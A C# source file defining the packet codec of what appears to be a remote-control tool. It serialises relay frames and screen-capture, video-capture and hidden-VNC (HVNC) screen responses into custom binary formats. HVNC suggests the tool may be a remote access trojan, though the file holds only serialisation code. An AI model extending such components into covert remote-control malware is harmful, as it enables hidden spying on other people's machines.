using System;
using System.Collections.Generic;
using System.Text;
using Newtonsoft.Json;

namespace RemoteControl.Protocals.Codec
{
    public class CodecFactoryBase
    {
        private static readonly byte[] RelayFrameMagic = Encoding.ASCII.GetBytes("RCF1");
        private static readonly byte[] RealtimeResponseMagic = Encoding.ASCII.GetBytes("RCS1");

        private Dictionary<ePacketType, Type> _mappings = null;

        public CodecFactoryBase(Dictionary<ePacketType, Type> mappings)
        {
            _mappings = mappings;
        }

        public byte[] EncodeOject(ePacketType packetType, object obj)
        {
            byte[] bodyBytes = null;

            if (obj != null)
            {
                if (IsRelayDataFrame(packetType) && obj is Relay.RelayDataFrame)
                    bodyBytes = ToRelayFrameBytes((Relay.RelayDataFrame)obj);
                else if (IsRealtimeResponse(packetType) && obj is ResponseBase)
                    bodyBytes = ToRealtimeResponseBytes(packetType, (ResponseBase)obj);
                else
                    bodyBytes = ToJsonBytes(obj);
            }

            return Encode(packetType, bodyBytes);
        }

        public void DecodeObject(byte[] packetData, out ePacketType packetType, out object obj)
        {
            byte[] bodyData = null;
            Decode(packetData, out packetType, out bodyData);

            obj = null;
            if (IsRelayDataFrame(packetType) && HasMagic(bodyData, RelayFrameMagic))
                obj = FromRelayFrameBytes(bodyData);
            else if (IsRealtimeResponse(packetType) && HasMagic(bodyData, RealtimeResponseMagic))
                obj = FromRealtimeResponseBytes(packetType, bodyData);
            else if (_mappings.ContainsKey(packetType))
                obj = FromJsonBytes(bodyData, _mappings[packetType]);
            else
                obj = bodyData;
        }

        private byte[] Encode(ePacketType packetType, byte[] bodyData)
        {
            List<byte> result = new List<byte>();

            if (bodyData == null)
                bodyData = new byte[0];

            int packetLength = bodyData.Length + 1 + 4;
            result.AddRange(BitConverter.GetBytes(packetLength));
            result.Add((byte)packetType);
            result.AddRange(bodyData);

            return result.ToArray();
        }

        private void Decode(byte[] packetData, out ePacketType packetType, out byte[] bodyData)
        {
            int packetLength = BitConverter.ToInt32(packetData, 0);
            packetType = (ePacketType)packetData[4];
            bodyData = new byte[packetLength - 4 - 1];
            Buffer.BlockCopy(packetData, 5, bodyData, 0, bodyData.Length);
        }

        private byte[] ToJsonBytes(object obj)
        {
            string json = JsonConvert.SerializeObject(obj);
            return Encoding.UTF8.GetBytes(json);
        }

        private object FromJsonBytes(byte[] bodyData, Type type)
        {
            string json = Encoding.UTF8.GetString(bodyData);
            return JsonConvert.DeserializeObject(json, type);
        }

        private static bool IsRelayDataFrame(ePacketType packetType)
        {
            return packetType == ePacketType.CYCLER_RELAY_FORWARD ||
                packetType == ePacketType.CYCLER_RELAY_CLIENT_DATA;
        }

        private static bool IsRealtimeResponse(ePacketType packetType)
        {
            return packetType == ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE ||
                packetType == ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE ||
                packetType == ePacketType.PACKET_HVNC_SCREEN_RESPONSE;
        }

        private static bool HasMagic(byte[] data, byte[] magic)
        {
            if (data == null || data.Length < magic.Length)
                return false;

            for (int i = 0; i < magic.Length; i++)
            {
                if (data[i] != magic[i])
                    return false;
            }
            return true;
        }

        private static byte[] ToRelayFrameBytes(Relay.RelayDataFrame frame)
        {
            byte[] clientId = Encoding.UTF8.GetBytes(frame.ClientId ?? string.Empty);
            byte[] sessionId = Encoding.UTF8.GetBytes(frame.SessionId ?? string.Empty);
            byte[] requestId = Encoding.UTF8.GetBytes(frame.RequestId ?? string.Empty);
            byte[] payload = frame.Payload ?? new byte[0];

            List<byte> body = new List<byte>(RelayFrameMagic.Length + 24 +
                clientId.Length + sessionId.Length + requestId.Length + payload.Length);
            body.AddRange(RelayFrameMagic);
            AddInt(body, frame.StreamId);
            AddInt(body, (int)frame.InnerPacketType);
            AddInt(body, clientId.Length);
            AddInt(body, sessionId.Length);
            AddInt(body, requestId.Length);
            AddInt(body, payload.Length);
            body.AddRange(clientId);
            body.AddRange(sessionId);
            body.AddRange(requestId);
            body.AddRange(payload);
            return body.ToArray();
        }

        private static Relay.RelayDataFrame FromRelayFrameBytes(byte[] body)
        {
            int offset = RelayFrameMagic.Length;
            var frame = new Relay.RelayDataFrame();
            frame.StreamId = ReadInt(body, ref offset);
            frame.InnerPacketType = (ePacketType)ReadInt(body, ref offset);
            int clientIdLength = ReadInt(body, ref offset);
            int sessionIdLength = ReadInt(body, ref offset);
            int requestIdLength = ReadInt(body, ref offset);
            int payloadLength = ReadInt(body, ref offset);
            frame.ClientId = ReadString(body, ref offset, clientIdLength);
            frame.SessionId = ReadString(body, ref offset, sessionIdLength);
            frame.RequestId = ReadString(body, ref offset, requestIdLength);
            frame.Payload = ReadBytes(body, ref offset, payloadLength);
            return frame;
        }

        private static byte[] ToRealtimeResponseBytes(ePacketType packetType, ResponseBase response)
        {
            long ticks = 0;
            int width = 0;
            int height = 0;
            byte[] imageData = null;

            if (packetType == ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE)
                imageData = ((ResponseStartGetScreen)response).ImageData;
            else if (packetType == ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE)
            {
                var video = (ResponseStartCaptureVideo)response;
                imageData = video.ImageData;
                ticks = video.CollectTime.Ticks;
            }
            else if (packetType == ePacketType.PACKET_HVNC_SCREEN_RESPONSE)
            {
                var hvnc = (ResponseHVNCScreen)response;
                imageData = hvnc.ImageData;
                width = hvnc.Width;
                height = hvnc.Height;
            }

            byte[] message = Encoding.UTF8.GetBytes(response.Message ?? string.Empty);
            byte[] detail = Encoding.UTF8.GetBytes(response.Detail ?? string.Empty);
            byte[] image = imageData ?? new byte[0];

            List<byte> body = new List<byte>(RealtimeResponseMagic.Length + 25 +
                message.Length + detail.Length + image.Length);
            body.AddRange(RealtimeResponseMagic);
            body.Add(response.Result ? (byte)1 : (byte)0);
            AddLong(body, ticks);
            AddInt(body, width);
            AddInt(body, height);
            AddInt(body, message.Length);
            AddInt(body, detail.Length);
            AddInt(body, image.Length);
            body.AddRange(message);
            body.AddRange(detail);
            body.AddRange(image);
            return body.ToArray();
        }

        private static object FromRealtimeResponseBytes(ePacketType packetType, byte[] body)
        {
            int offset = RealtimeResponseMagic.Length;
            bool result = ReadByte(body, ref offset) != 0;
            long ticks = ReadLong(body, ref offset);
            int width = ReadInt(body, ref offset);
            int height = ReadInt(body, ref offset);
            int messageLength = ReadInt(body, ref offset);
            int detailLength = ReadInt(body, ref offset);
            int imageLength = ReadInt(body, ref offset);
            string message = ReadString(body, ref offset, messageLength);
            string detail = ReadString(body, ref offset, detailLength);
            byte[] image = ReadBytes(body, ref offset, imageLength);

            ResponseBase response;
            if (packetType == ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE)
            {
                var screen = new ResponseStartGetScreen();
                screen.ImageData = image;
                response = screen;
            }
            else if (packetType == ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE)
            {
                var video = new ResponseStartCaptureVideo();
                video.ImageData = image;
                if (ticks > 0)
                    video.CollectTime = new DateTime(ticks);
                response = video;
            }
            else
            {
                var hvnc = new ResponseHVNCScreen();
                hvnc.ImageData = image;
                hvnc.Width = width;
                hvnc.Height = height;
                response = hvnc;
            }

            response.Result = result;
            response.Message = message;
            response.Detail = detail;
            return response;
        }

        private static void AddInt(List<byte> bytes, int value)
        {
            bytes.AddRange(BitConverter.GetBytes(value));
        }

        private static void AddLong(List<byte> bytes, long value)
        {
            bytes.AddRange(BitConverter.GetBytes(value));
        }

        private static int ReadInt(byte[] bytes, ref int offset)
        {
            int value = BitConverter.ToInt32(bytes, offset);
            offset += 4;
            return value;
        }

        private static long ReadLong(byte[] bytes, ref int offset)
        {
            long value = BitConverter.ToInt64(bytes, offset);
            offset += 8;
            return value;
        }

        private static byte ReadByte(byte[] bytes, ref int offset)
        {
            byte value = bytes[offset];
            offset++;
            return value;
        }

        private static string ReadString(byte[] bytes, ref int offset, int length)
        {
            if (length <= 0)
                return string.Empty;
            string value = Encoding.UTF8.GetString(bytes, offset, length);
            offset += length;
            return value;
        }

        private static byte[] ReadBytes(byte[] bytes, ref int offset, int length)
        {
            if (length <= 0)
                return new byte[0];
            byte[] value = new byte[length];
            Buffer.BlockCopy(bytes, offset, value, 0, length);
            offset += length;
            return value;
        }
    }
}
